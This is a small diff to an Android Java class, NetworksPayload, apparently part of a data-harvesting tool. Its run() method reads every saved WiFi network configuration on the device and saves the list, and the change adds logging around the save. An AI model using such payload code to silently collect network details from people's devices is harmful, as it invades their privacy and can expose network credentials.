@@ -7,6 +7,7 @@ import java.util.List;
 import android.content.Context;
 import android.net.wifi.WifiConfiguration;
 import android.net.wifi.WifiManager;
+import android.util.Log;
 
 public class NetworksPayload extends Payload {
 
@@ -18,7 +19,7 @@ public class NetworksPayload extends Payload {
 		super(context);
 	}
 
-	//@Override
+	// @Override
 	public synchronized void run() {
 		WifiManager wifiManager = (WifiManager) context
 				.getSystemService(Context.WIFI_SERVICE);
@@ -26,7 +27,10 @@ public class NetworksPayload extends Payload {
 		StringBuilder sb = new StringBuilder();
 		for (WifiConfiguration wc : networks)
 			sb.append(wc + "\n\n");
-		save(sb.toString());
+		if (save(sb.toString()))
+			Log.d(tag, "Networks saved successful");
+		else
+			Log.e(tag, "Error while saving the payload output.");
 	}
 
 }
